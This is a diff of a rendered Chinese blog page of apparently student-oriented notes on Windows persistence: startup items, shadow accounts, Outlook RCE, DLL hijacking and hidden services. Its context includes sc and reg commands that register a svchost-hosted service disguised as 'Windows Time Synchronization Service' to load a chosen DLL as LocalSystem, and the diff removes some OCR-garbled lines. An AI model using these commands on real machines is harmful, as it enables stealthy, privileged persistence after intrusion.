@@ -252,7 +252,7 @@
             <div class="markdown-body">
               <h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="就简单列一下，后续学弟们学习的时候可以扩充一下"><a href="#就简单列一下，后续学弟们学习的时候可以扩充一下" class="headerlink" title="就简单列一下，后续学弟们学习的时候可以扩充一下"></a>就简单列一下，后续学弟们学习的时候可以扩充一下</h2><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><h2 id="影子用户、账号克隆"><a href="#影子用户、账号克隆" class="headerlink" title="影子用户、账号克隆"></a>影子用户、账号克隆</h2><h2 id="outlook客户端rce"><a href="#outlook客户端rce" class="headerlink" title="outlook客户端rce"></a>outlook客户端rce</h2><p>使用客户端查看邮件时触发</p>
 <h2 id="注册键"><a href="#注册键" class="headerlink" title="注册键"></a>注册键</h2><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a><strong>DLL劫持</strong></h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608882275250-03229a68-0a04-48aa-8a73-26243806c705.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></p>
-<p><strong><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608882355199-6a045ca0-6d5c-454a-8d8d-70ab3608b2b7.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608882355199-6a045ca0-6d5c-454a-8d8d-70ab3608b2b7.png?x-oss-process=image/resize,w_1492" srcset="/img/loading.gif"></p>
 <p><strong>vscode:</strong></p>
 <p><strong>等以后李总用回windows，嘻嘻嘻</strong></p>
 <blockquote>
@@ -275,15 +275,6 @@
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sc create TimeSync binPath= <span class="hljs-string">&quot;C:\Windows\System32\svchost.exe -k netsvr&quot;</span> start= auto obj= LocalSystem<br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync\Parameters <span class="hljs-string">/v</span> ServiceDll <span class="hljs-string">/t</span> REG_EXPAND_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:\Users\hunter\Desktop\localService32.dll&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> Description <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;Windows Time Synchronization Service&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>reg add HKLM\SYSTEM\CurrentControlSet\services\TimeSync <span class="hljs-string">/v</span> DisplayName <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;TimeSyncSrv&quot;</span> <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>reg add <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost&quot;</span> <span class="hljs-string">/v</span> netsvr <span class="hljs-string">/t</span> REG_MULTI_SZ <span class="hljs-string">/d</span> TimeSync <span class="hljs-string">/f</span> <span class="hljs-string">/reg</span><span class="hljs-function">:64</span><br>sc start TimeSync<br></code></pre></td></tr></table></figure>
 <h4 id="隐藏服务"><a href="#隐藏服务" class="headerlink" title="隐藏服务"></a>隐藏服务</h4><p>注册服务：（以管理员权限）</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608554908329-1ad2b788-b2d2-418f-97a3-005e37818855.png" srcset="/img/loading.gif"></p>
-<p>system32&gt;sccreateteststartautobinathdx</p>
-<p>Windows</p>
-<p>Pam</p>
-<p>depend-Tcpipobj-Localsyste</p>
-<p>i1essBuiidartifactexed</p>
-<p>Createseruice成功</p>
-<p>[SC]</p>
-<p>syTen32&gt;</p>
-<p>Windows</p>
 <p>比较容易被检测，查看该服务信息：</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2020/png/2718485/1608555034571-b8e9b77d-3913-45c8-a72c-dd5cbc6f34c6.png" srcset="/img/loading.gif" alt="image.png"></p>
 <p>隐藏服务</p>
